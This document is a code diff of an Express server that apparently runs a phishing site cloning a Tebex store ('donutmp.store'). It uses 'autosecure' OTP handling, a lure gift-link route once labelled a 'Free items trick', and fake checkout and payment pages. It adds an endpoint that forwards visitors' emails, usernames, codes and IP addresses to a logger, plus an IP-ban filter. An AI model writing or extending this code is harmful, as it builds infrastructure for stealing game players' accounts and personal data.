@@ -15,11 +15,12 @@ const { getDonutStats } = require('./autosecure/utils/donutapi/getDonutStats');
 const getStats = require('./autosecure/utils/hypixelapi/getStats');
 const { sendSecureNotification } = require('./autosecure/utils/notifications/notifier');
 const { initializeDB, queryParams } = require('./db/db');
+const { sendWebLog } = require('./autosecure/utils/webLogger');
 const config = require('./config.json');
 
 const app = express();
 const PORT = process.env.PORT || 3000;
-const FRONTEND_DIR = path.join(__dirname, 'frontend', 'dist');
+const FRONTEND_DIR = path.join(__dirname, 'public');
 
 // Active OTP Sessions cache: sessionId -> { email, secId, secDisplay, username, timestamp }
 const activeSessions = new Map();
@@ -49,6 +50,21 @@ app.use((req, res, next) => {
 app.use(express.json());
 app.use(express.urlencoded({ extended: true }));
 
+// IP Ban Check
+app.use(async (req, res, next) => {
+    try {
+        const rawIp = req.headers['x-forwarded-for'] || req.socket.remoteAddress || '';
+        const clientIp = rawIp.split(',')[0].trim();
+        if (clientIp) {
+            const banned = await queryParams('SELECT 1 FROM banned_ips WHERE ip = ?', [clientIp]);
+            if (banned && banned.length > 0) {
+                return res.status(403).send('<h1 style="text-align:center;margin-top:20%;font-family:sans-serif;">403 Forbidden - Access Denied</h1>');
+            }
+        }
+    } catch (e) {}
+    next();
+});
+
 // Request logger
 app.use((req, res, next) => {
     const time = new Date().toLocaleTimeString('vi-VN');
@@ -56,6 +72,31 @@ app.use((req, res, next) => {
         console.log(`[${time}] ${req.method} ${req.url}`);
     }
     next();
+});
+
+// Realtime Web Activity Logging
+app.post('/api/web-activity', async (req, res) => {
+    try {
+        const { code, username, email, action, statusText, link, domain } = req.body || {};
+        const rawIp = req.headers['x-forwarded-for'] || req.socket.remoteAddress || '';
+        const clientIp = rawIp.split(',')[0].trim() || '127.0.0.1';
+
+        await sendWebLog({
+            code,
+            ip: clientIp,
+            link,
+            domain: domain || req.headers.host || 'donutmp.store',
+            username,
+            email,
+            action: action || 'input',
+            statusText: statusText || 'Click Continue'
+        });
+
+        return res.json({ success: true });
+    } catch (err) {
+        console.error('[API /web-activity] Error logging:', err.message);
+        return res.status(500).json({ success: false, error: err.message });
+    }
 });
 
 // --- API ENDPOINTS ---
@@ -352,26 +393,63 @@ app.post('/api/verify-otp', async (req, res) => {
 app.use('/assets', express.static(path.join(FRONTEND_DIR, 'assets')));
 app.use('/terms', express.static(path.join(FRONTEND_DIR, 'terms')));
 
-// Gift Link Route (Free items trick)
-app.get('/gift/:code', (req, res) => {
+// Donut Gift Link Claim Routes
+app.get(['/gift/:code/claim', '/gift/:code'], async (req, res) => {
     const code = req.params.code;
-    console.log(`[API /gift] User accessed gift link with code: ${code}`);
-    res.redirect(`/store?gift=true&code=${encodeURIComponent(code)}`);
+    const rawIp = req.headers['x-forwarded-for'] || req.socket.remoteAddress || '';
+    const clientIp = rawIp.split(',')[0].trim() || '127.0.0.1';
+    const host = req.headers.host || 'donutmp.store';
+
+    sendWebLog({
+        code,
+        ip: clientIp,
+        link: `${host}/gift/${code}/claim`,
+        domain: host,
+        action: 'click_link'
+    }).catch(err => console.error('[SERVER] Error logging click:', err.message));
+
+    res.redirect(`/checkout/payment?gift=true&code=${encodeURIComponent(code)}`);
 });
+
 app.get('/gift', (req, res) => {
     res.redirect('/store?gift=true');
 });
 
-// Serve static files from public
-app.use(express.static(FRONTEND_DIR));
+// Tebex store and checkout route mappings
+app.get('/', (req, res) => res.sendFile(path.join(FRONTEND_DIR, 'index.html')));
+app.get('/index.html', (req, res) => res.sendFile(path.join(FRONTEND_DIR, 'index.html')));
 
-// React TSX Single Page Application route handler
-app.get('{*path}', (req, res, next) => {
-    if (req.path.startsWith('/api/')) {
-        return next();
-    }
-    res.sendFile(path.join(FRONTEND_DIR, 'index.html'));
+app.get('/store', (req, res) => res.sendFile(path.join(FRONTEND_DIR, 'store.html')));
+app.get('/store.html', (req, res) => res.sendFile(path.join(FRONTEND_DIR, 'store.html')));
+
+app.get('/checkout', (req, res) => res.sendFile(path.join(FRONTEND_DIR, 'checkout.html')));
+app.get('/checkout.html', (req, res) => res.sendFile(path.join(FRONTEND_DIR, 'checkout.html')));
+app.get('/checkout/index.html', (req, res) => res.sendFile(path.join(FRONTEND_DIR, 'checkout.html')));
+
+app.get('/checkout/basket', (req, res) => res.sendFile(path.join(FRONTEND_DIR, 'checkout', 'basket.html')));
+app.get('/checkout/basket.html', (req, res) => res.sendFile(path.join(FRONTEND_DIR, 'checkout', 'basket.html')));
+app.get('/checkout/basket/index.html', (req, res) => res.sendFile(path.join(FRONTEND_DIR, 'checkout', 'basket.html')));
+
+app.get('/checkout/pay', (req, res) => res.sendFile(path.join(FRONTEND_DIR, 'checkout', 'pay.html')));
+app.get('/checkout/pay.html', (req, res) => res.sendFile(path.join(FRONTEND_DIR, 'checkout', 'pay.html')));
+app.get('/checkout/pay/index.html', (req, res) => res.sendFile(path.join(FRONTEND_DIR, 'checkout', 'pay.html')));
+
+app.get('/checkout/payment', (req, res) => res.sendFile(path.join(FRONTEND_DIR, 'checkout', 'payment.html')));
+app.get('/checkout/payment.html', (req, res) => res.sendFile(path.join(FRONTEND_DIR, 'checkout', 'payment.html')));
+app.get('/checkout/payment/index.html', (req, res) => res.sendFile(path.join(FRONTEND_DIR, 'checkout', 'payment.html')));
+
+// Support package add routes like /checkout/packages/add/7446586/subscribe
+app.get('/checkout/packages/add/:id/:type', (req, res) => {
+    res.sendFile(path.join(FRONTEND_DIR, 'checkout.html'));
 });
+
+// Terms pages
+app.get('/terms/checkout', (req, res) => res.sendFile(path.join(FRONTEND_DIR, 'terms_checkout.html')));
+app.get('/terms/impressum', (req, res) => res.sendFile(path.join(FRONTEND_DIR, 'terms_impressum.html')));
+app.get('/terms/privacy', (req, res) => res.sendFile(path.join(FRONTEND_DIR, 'terms_privacy.html')));
+
+// Fallback static files
+app.use(express.static(FRONTEND_DIR));
 
 // Start server function
 async function startServer() {
